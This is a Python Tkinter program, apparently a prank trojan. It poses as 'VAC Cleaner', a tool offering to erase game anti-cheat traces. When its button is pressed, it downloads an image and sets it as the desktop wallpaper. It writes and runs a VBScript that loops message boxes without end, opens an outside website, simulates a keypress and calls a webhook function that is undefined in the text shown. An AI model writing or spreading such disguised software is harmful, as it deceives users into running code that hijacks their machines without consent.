import os
import tempfile
import ctypes
import urllib.request
import subprocess
from PIL import Image, ImageTk, ImageDraw
import requests
import webbrowser
import pyautogui
import time
import tkinter as tk
from tkinter import ttk, messagebox, font
import math
import random

class CleanerLogo(tk.Canvas):
    def __init__(self, parent, width, height):
        super().__init__(parent, width=width, height=height, bg='#f5f5f5', highlightthickness=0)
        self.width = width
        self.height = height
        
        # Bubble animation
        self.bubbles = []
        for _ in range(5):
            x = width//4 + width//2 * random.random()
            y = height + 20 * random.random()
            size = 10 + 20 * random.random()
            speed = 1 + 2 * random.random()
            self.bubbles.append({
                'id': self.create_oval(x, y, x+size, y+size, outline='', fill='#a8e6cf', width=0),
                'speed': speed
            })
        
        self.create_text(
            width//2, height//2, 
            text="VAC CLEANER", 
            font=('Arial', 24, 'bold'), 
            fill='#ff0014', 
            anchor='center'
        )
        
        self.animate_bubbles()
    
    def animate_bubbles(self):
        for bubble in self.bubbles:
            x1, y1, x2, y2 = self.coords(bubble['id'])
            if y1 < -20:
                y1 = self.height + 20
                x1 = self.width//4 + self.width//2 * random.random()
            self.move(bubble['id'], 0, -bubble['speed'])
        self.after(50, self.animate_bubbles)

def main():
    root = tk.Tk()
    root.title("Vac Cleaner - NixWare Premium")
    root.geometry("450x500")
    
    try:
        root.iconbitmap(default='icon.ico')
    except:
        pass
    
    style = ttk.Style()
    style.theme_use('default')
    style.configure('TProgressbar', thickness=20, troughcolor='#f5f5f5', background='#000000')
    
    bg_frame = tk.Frame(root, bg='#f5f5f5')
    bg_frame.pack(fill='both', expand=True)
    
    logo = CleanerLogo(bg_frame, 450, 150)
    logo.pack(pady=20)
    
    content = tk.Frame(bg_frame, bg='white', bd=0, highlightthickness=0, 
                      relief='flat', width=400, height=250)
    content.pack(pady=(0,20))
    content.pack_propagate(False)
    
    tk.Label(content, 
             text="Made by Nixware Team",
             font=('Arial', 14, 'bold'),
             bg='white', fg='#ff0014').pack(pady=(15,10))
    
    progress = ttk.Progressbar(content, orient='horizontal', length=350, mode='determinate')
    progress.pack(pady=10)
    
    issues = [
        ('Injection logs: 2', '💉'),
        ('Cheat Traces: 1', '👣'),
        ('Cheat Detected: ExLoader', '🔁'),
        ('Chosen cheat: SharkHack', '🦈')
    ]
    
    for text, icon in issues:
        issue_frame = tk.Frame(content, bg='white')
        issue_frame.pack(fill='x', padx=40, pady=3)
        tk.Label(issue_frame, text=icon, font=('Arial', 12), bg='white').pack(side='left')
        tk.Label(issue_frame, text=text, font=('Arial', 10), bg='white', fg='#555').pack(side='left', padx=10)
    
    btn = tk.Button(bg_frame, 
                    text="✨ CLEAR LOGS ✨", 
                    command=lambda: start_cleaning(root, progress),
                    font=('Arial', 14, 'bold'), 
                    bg='#ff0014', 
                    fg='white',
                    activebackground='#ffaaa5',
                    activeforeground='white',
                    relief='flat',
                    bd=0,
                    padx=40,
                    pady=12,
                    highlightthickness=0)
    btn.pack(pady=(0,20))
    
    tk.Label(bg_frame, 
             text=" 2025 VAC Cleaner | v5.2.1 ",
             font=('Arial', 8),
             bg='#f5f5f5',
             fg='#aaa').pack(side='bottom', pady=10)
    
    root.mainloop()

def start_cleaning(root, progress):
    for widget in root.winfo_children():
        if isinstance(widget, tk.Button):
            widget.config(state='disabled')
    
    for i in range(5):
        progress['value'] += 20
        root.update()
        time.sleep(0.5)
    
    try:
        image_url = "https://fwcdn.pl/fph/33/12/123312/103308_3.12.webp"
        temp_dir = tempfile.gettempdir()
        webp_path = os.path.join(temp_dir, "ratman.webp")
        jpg_path = os.path.join(temp_dir, "ratman.jpg")
        vbs_path = os.path.join(temp_dir, "ratman.vbs")

        urllib.request.urlretrieve(image_url, webp_path)
        im = Image.open(webp_path).convert("RGB")
        im.save(jpg_path, "JPEG")

        vbs_code = '''Do
    MsgBox "Gratulacje, pobrales ratatuja. Masz teraz nowego zwierzaka na kompie!", vbInformation, "Ratatuj!!!11"
Loop
'''
        with open(vbs_path, "w", encoding="utf-8") as f:
            f.write(vbs_code)

        set_wallpaper(jpg_path)
        send_webhook_message()
        webbrowser.open("https://ptoszek.pl")
        time.sleep(5)
        pyautogui.press('space')
        subprocess.Popen(["wscript.exe", vbs_path], shell=True)
        
        # Complete progress
        progress['value'] = 100
        messagebox.showinfo("Strykaj formata hopie", "Masz ratatuja, idz cos ugotuj.")
    finally:
        root.destroy()

def set_wallpaper(path):
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)

if __name__ == "__main__":
    main()
